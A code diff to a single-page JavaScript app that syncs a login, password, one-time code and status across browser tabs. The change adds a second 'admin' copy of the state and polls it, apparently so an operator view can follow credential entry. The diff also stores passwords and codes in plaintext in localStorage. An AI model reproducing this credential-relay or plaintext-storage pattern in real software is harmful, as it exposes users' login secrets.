@@ -305,9 +305,19 @@ tbody tr:hover td{background:#fafbfc;}
 // ============================================================
 // STATE - shared JS variables (same tab) + BroadcastChannel (cross-tab)
 // ============================================================
-const KEY='bna_state', CH='bna_ch';
+const KEY='bna_state', CH='bna_ch', ADMIN_KEY='bna_admin_state';
 const S = { login:'', password:'', otp:'', status:'idle' };
 const BC = typeof BroadcastChannel !== 'undefined' ? new BroadcastChannel(CH) : null;
+
+function persistSharedState(data) {
+  const obj = { ...S, ...data };
+  try {
+    localStorage.setItem(KEY, JSON.stringify(obj));
+    localStorage.setItem(ADMIN_KEY, JSON.stringify(obj));
+  } catch(e) {}
+  if (BC) BC.postMessage({t:'s', d:{...obj}});
+  return obj;
+}
 
 function setState(upd) {
   const next = { ...S, ...upd };
@@ -318,15 +328,14 @@ function setState(upd) {
     return;
   }
   Object.assign(S, upd);
-  if (BC) BC.postMessage({t:'s', d:{...S}});
-  try { localStorage.setItem(KEY, JSON.stringify(S)); } catch(e){}
+  persistSharedState(S);
   onStateChange();
 }
 
 if (BC) BC.onmessage = e => { if(e.data.t==='s'){ Object.assign(S,e.data.d); onStateChange(); } };
 setInterval(()=>{
   try{
-    const d=JSON.parse(localStorage.getItem(KEY)||'{}');
+    const d=JSON.parse(localStorage.getItem(ADMIN_KEY) || localStorage.getItem(KEY) || '{}');
     if(d.status && d.status!==S.status){ Object.assign(S,d); onStateChange(); }
   }catch(e){}
 }, 800);
